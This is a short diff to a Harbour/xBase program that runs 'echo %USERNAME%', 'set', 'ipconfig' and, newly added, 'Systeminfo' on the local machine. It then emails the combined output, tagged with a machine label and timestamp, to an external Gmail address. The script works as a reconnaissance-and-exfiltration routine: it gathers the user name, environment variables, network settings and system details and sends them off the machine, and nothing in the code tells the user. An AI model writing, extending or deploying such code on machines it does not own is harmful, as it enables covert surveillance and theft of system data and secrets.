@@ -2,6 +2,7 @@
 PROCEDURE MAIN
 
    LOCAL aCommand := {}, cCommand
+   LOCAL cLabel := "noteradeon"
    
    LOCAL cCommandTodos := ""
    LOCAL  cTo := "hbmshell@gmail.com" //"vlademirolandim@gmail.com"
@@ -11,6 +12,8 @@ PROCEDURE MAIN
    AADD( aCommand , "echo %USERNAME%" )
    AADD( aCommand , "set" )
    AADD( aCommand , "ipconfig" )
+   AADD( aCommand , "Systeminfo" )
+   
    
    FOR x := 1 TO LEN( aCommand )
        EXEC RUN aCommand[x]  TO cCommand
@@ -19,7 +22,7 @@ PROCEDURE MAIN
        cCommandTodos += cCommand + hb_eol()
    NEXT
 
-   EnviaEmail( cPreOrigem, cTo, "Resultado da máquina " + dtoc(Date()) + " " + Time() + " " + StrZero(Seconds(),7) , cCommandTodos )
+   EnviaEmail( cPreOrigem, cTo, "Resultado da máquina " + cLabel + " em " + dtoc(Date()) + " " + Time() + " " + StrZero(Seconds(),7) , cCommandTodos )
    
  RETURN  
 
